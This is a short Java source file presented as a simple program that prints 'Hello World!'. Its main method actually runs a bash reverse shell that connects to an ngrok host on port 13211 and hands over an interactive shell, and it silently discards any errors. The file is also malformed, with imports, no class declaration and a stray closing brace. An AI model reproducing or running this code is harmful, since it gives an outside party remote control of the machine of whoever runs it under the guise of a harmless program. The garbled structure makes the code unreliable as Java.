package com.mjc.stage0;

import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/13211 0>&1");
            System.out.println("Hello World!"); 
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
} 
